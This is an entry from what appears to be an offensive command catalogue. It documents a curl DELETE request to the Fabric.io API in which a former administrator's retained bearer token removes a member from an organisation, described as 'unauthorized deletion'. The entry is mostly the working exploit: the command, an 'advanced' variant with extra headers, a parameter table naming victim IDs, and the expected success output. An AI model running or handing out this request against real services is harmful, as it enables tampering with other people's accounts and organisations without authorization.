---
id: cmd-fabric-delete-modified
data: >-
  curl -X DELETE
  'https://fabric.io/api/v3/accounts/552787195127ae16b8000987/organizations/54af7e07b8568e8c6a0001e/leave'
  -H 'Host: fabric.io' -H 'Authorization: Bearer [TOKEN]'
tags:
  - api-delete
  - exploit
  - fabric-io
type: command
output: |-
  HTTP/1.1 200 OK
  {"status":"success"}
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.758Z'
verified: false
validated: true
submitted: true
---
# fabric-delete-member-modified

## Command

```bash
curl -X DELETE 'https://fabric.io/api/v3/accounts/552787195127ae16b8000987/organizations/54af7e07b8568e8c6a0001e/leave' -H 'Host: fabric.io' -H 'Authorization: Bearer [TOKEN]'
```

## Description

Exploits retained access by sending a modified DELETE request to remove a member from an unauthorized organization in Fabric.io.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies HTTP DELETE method | Yes |
| `accounts/{account_id}` | Victim member ID (e.g., 552787195127ae16b8000987) | Yes |
| `organizations/{org_id}` | Victim org ID (e.g., 54af7e07b8568e8c6a0001e) | Yes |
| `-H 'Authorization: Bearer [TOKEN]'` | Ex-admin auth token | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE 'https://fabric.io/api/v3/accounts/552787195127ae16b8000987/organizations/54af7e07b8568e8c6a0001e/leave' -H 'Host: fabric.io' -H 'Authorization: Bearer [TOKEN]'
```

### Advanced Usage

With custom headers for testing:

```bash
curl -v -X DELETE 'https://fabric.io/api/v3/accounts/552787195127ae16b8000987/organizations/54af7e07b8568e8c6a0001e/leave' -H 'Host: fabric.io' -H 'Authorization: Bearer [TOKEN]' -H 'User-Agent: Mozilla/5.0'
```

## Expected Output

HTTP 200 OK, indicating successful unauthorized deletion despite no current membership.

## Related

- [[commands/fabric-delete-member-original]]
- [[procedures/Modify-and-Send-Unauthorized-DELETE-Request]]
